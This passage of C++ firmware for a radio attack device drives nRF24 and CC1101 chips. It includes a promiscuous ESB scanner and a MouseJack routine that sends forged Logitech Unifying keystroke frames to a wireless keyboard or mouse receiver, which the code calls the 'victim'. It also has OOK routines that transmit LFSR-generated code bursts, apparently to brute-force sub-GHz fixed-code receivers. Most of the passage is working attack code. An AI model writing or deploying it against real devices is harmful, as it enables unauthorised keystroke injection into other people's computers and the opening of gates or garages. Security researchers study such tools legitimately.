  SPI.transfer(0x20 | (reg & 0x1F));
  SPI.transfer(b0); SPI.transfer(b1); SPI.transfer(b2);
  digitalWrite(kPins.nrf24Csn, HIGH);
  SPI.endTransaction();
}

// Read n bytes from nRF24 RX payload into buf
static void nrf24ReadPayload(uint8_t* buf, uint8_t n) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.nrf24Csn, LOW);
  SPI.transfer(0x61);  // R_RX_PAYLOAD
  for (uint8_t i = 0; i < n; ++i) buf[i] = SPI.transfer(0xFF);
  digitalWrite(kPins.nrf24Csn, HIGH);
  SPI.endTransaction();
}

// Write 5-byte address to nRF24 TX_ADDR or RX_ADDR_P0
static void nrf24WriteAddr5(uint8_t reg, const uint8_t* addr) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.nrf24Csn, LOW);
  SPI.transfer(0x20 | (reg & 0x1F));
  for (int i = 0; i < 5; ++i) SPI.transfer(addr[i]);
  digitalWrite(kPins.nrf24Csn, HIGH);
  SPI.endTransaction();
}

EsbScanResult hardwareNrf24ScanEsb(int startCh, int endCh, int dwellMs) {
  EsbScanResult result = {false, {0}, -1, 0, {0}};
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) return result;

  // Promiscuous ESB mode: use 3-byte address width + preamble-pattern address.
  // This lets the nRF24 receive any ESB packet whose on-air preamble aligns.
  nrf24WriteReg(0x00, 0x0B);  // CONFIG: PWR_UP, PRIM_RX, EN_CRC
  nrf24WriteReg(0x01, 0x00);  // EN_AA: off
  nrf24WriteReg(0x02, 0x01);  // EN_RXADDR: P0
  nrf24WriteReg(0x03, 0x01);  // AW: 3-byte address width
  nrf24WriteReg(0x11, 32);    // RX_PW_P0: 32 bytes fixed
  nrf24WriteReg(0x06, 0x07);  // RF_SETUP: 1Mbps (matches most mice/keyboards)

  const uint8_t kProbeAddrs[3][3] = {
    {0xAA, 0xAA, 0xAA},
    {0x55, 0x55, 0x55},
    {0x33, 0x33, 0x33},
  };

  const int chStart = startCh < 0 ? 2 : startCh;
  const int chEnd   = endCh > 125 ? 83 : endCh;
  const int dwell   = dwellMs < 1 ? 2 : dwellMs;

  for (int probe = 0; probe < 3; ++probe) {
    nrf24WriteAddr3(0x0A, kProbeAddrs[probe][0], kProbeAddrs[probe][1], kProbeAddrs[probe][2]);
    for (int ch = chStart; ch <= chEnd; ++ch) {
      nrf24WriteReg(0x05, (uint8_t)ch);
      nrf24Command(0xE2);  // FLUSH_RX
      nrf24WriteReg(0x07, 0x70);
      digitalWrite(kPins.nrf24Ce, HIGH);
      delay(dwell);
      const uint8_t status = nrf24Command(0xFF);
      if (status & 0x40) {  // RX_DR
        uint8_t buf[32];
        nrf24ReadPayload(buf, 32);
        nrf24WriteReg(0x07, 0x40);
        digitalWrite(kPins.nrf24Ce, LOW);
        result.found   = true;
        result.channel = ch;
        result.dataLen = 32;
        for (int i = 0; i < 5; ++i) result.addr[i] = buf[i];
        for (int i = 0; i < 32; ++i) result.data[i] = buf[i];
        nrf24WriteReg(0x00, 0x00);
        return result;
      }
      digitalWrite(kPins.nrf24Ce, LOW);
    }
  }
  nrf24WriteReg(0x00, 0x00);
  digitalWrite(kPins.nrf24Ce, LOW);
  return result;
}

bool hardwareNrf24MouseJackInject(const EsbScanResult& target,
                                   uint8_t modifier,
                                   const uint8_t* keyCodes,
                                   uint8_t keyCount) {
  if (!target.found) return false;
  if (hardwareCurrentProfile() == HardwareProfile::LoraGpsCap) return false;

  nrf24WriteReg(0x00, 0x0A);  // CONFIG: PWR_UP, PRIM_TX
  nrf24WriteReg(0x01, 0x00);  // EN_AA off (no ack expected from victim)
  nrf24WriteReg(0x02, 0x01);
  nrf24WriteReg(0x03, 0x03);  // AW: 5-byte
  nrf24WriteReg(0x04, 0x00);  // no retry
  nrf24WriteReg(0x05, (uint8_t)target.channel);
  nrf24WriteReg(0x06, 0x07);  // 1Mbps

  nrf24WriteAddr5(0x10, target.addr);  // TX_ADDR
  nrf24WriteAddr5(0x0A, target.addr);  // RX_ADDR_P0 (for auto-ack addr match)
  delay(2);

  // Logitech Unifying HID keyboard frame format
  uint8_t frame[10] = {0x00, 0x00, modifier, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (uint8_t i = 0; i < keyCount && i < 6; ++i) frame[4 + i] = keyCodes[i];

  // Send key-down frame 3× for reliability
  for (int rep = 0; rep < 3; ++rep) {
    nrf24Command(0xE1);  // FLUSH_TX
    nrf24WriteFifoBurst(frame, 10);
    digitalWrite(kPins.nrf24Ce, HIGH);
    delayMicroseconds(15);
    digitalWrite(kPins.nrf24Ce, LOW);
    nrf24WriteReg(0x07, 0x70);
    delay(8);
  }

  // Send key-up frame (all zeros)
  uint8_t keyUp[10] = {};
  for (int rep = 0; rep < 2; ++rep) {
    nrf24Command(0xE1);
    nrf24WriteFifoBurst(keyUp, 10);
    digitalWrite(kPins.nrf24Ce, HIGH);
    delayMicroseconds(15);
    digitalWrite(kPins.nrf24Ce, LOW);
    nrf24WriteReg(0x07, 0x70);
    delay(8);
  }

  nrf24WriteReg(0x00, 0x00);  // PWR_DOWN
  return true;
}

// ─── CC1101 OOK / De Bruijn ───────────────────────────────

static void cc1101WritePatable(uint8_t p0, uint8_t p1) {
  SPI.beginTransaction(kRfSpiSettings);
  digitalWrite(kPins.cc1101Cs, LOW);
  SPI.transfer(0x7E);  // burst write PATABLE (0x3E | 0x40)
  SPI.transfer(p0);
  SPI.transfer(p1);
  digitalWrite(kPins.cc1101Cs, HIGH);
  SPI.endTransaction();
}

void hardwareCc1101StartOok(int bandMHz, int rateIdx) {
  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3B);  // SFTX
  const uint32_t freq = cc1101FreqWord(bandMHz);
  cc1101WriteReg(0x0D, (freq >> 16) & 0xFF);
  cc1101WriteReg(0x0E, (freq >>  8) & 0xFF);
  cc1101WriteReg(0x0F, (freq      ) & 0xFF);
  const uint8_t mdmcfg4 = 0xC5 + (uint8_t)(rateIdx < 0 ? 0 : rateIdx > 2 ? 2 : rateIdx);
  cc1101WriteReg(0x10, mdmcfg4);  // MDMCFG4: narrow BW, DRATE_E → 1.2/2.4/4.8kbps
  cc1101WriteReg(0x11, 0x83);     // MDMCFG3: DRATE_M=131
  cc1101WriteReg(0x12, 0x30);  // MDMCFG2: OOK, no sync word
  cc1101WriteReg(0x06, 0x3D);  // PKTLEN=61
  cc1101WriteReg(0x08, 0x00);  // PKTCTRL0: fixed length, no CRC
  cc1101WriteReg(0x22, 0x11);  // FREND0: use PA[1] for OOK '1' state
  cc1101WritePatable(0x00, 0x60);  // PA[0]=off, PA[1]=0 dBm
  cc1101Strobe(0x34);  // SCAL
  delay(3);
}

void hardwareCc1101SendOokBurst(uint8_t pattern) {
  cc1101Strobe(0x36);
  cc1101Strobe(0x3B);
  uint8_t fifo[61];
  memset(fifo, pattern, 61);
  cc1101WriteFifoBurst(fifo, 61);
  cc1101Strobe(0x35);  // STX
  delay(30);
}

void hardwareCc1101StopOok() {
  cc1101Strobe(0x36);  // SIDLE
  cc1101Strobe(0x3B);  // SFTX
}

void hardwareCc1101SendLfsrBurst(int codeBits, uint32_t& state) {
  if (state == 0) {
    state = 0xACE1u & ((1u << codeBits) - 1);
    if (state == 0) state = 1;
  }
  cc1101Strobe(0x36);
  cc1101Strobe(0x3B);
  uint8_t fifo[61] = {};
  for (int i = 0; i < 61 * 8; ++i) {
    uint32_t fb;
    if (codeBits <= 8) {
      fb = ((state >> 7) ^ (state >> 5) ^ (state >> 4) ^ (state >> 3)) & 1;
      state = ((state << 1) | fb) & 0xFF;
    } else if (codeBits <= 10) {
      fb = ((state >> 9) ^ (state >> 6)) & 1;
      state = ((state << 1) | fb) & 0x3FF;
    } else {
      fb = ((state >> 11) ^ (state >> 10) ^ (state >> 9) ^ (state >> 3)) & 1;
      state = ((state << 1) | fb) & 0xFFF;
    }
    fifo[i >> 3] |= (uint8_t)(fb << (7 - (i & 7)));
  }
  cc1101WriteFifoBurst(fifo, 61);
  cc1101Strobe(0x35);
  delay(30);
}
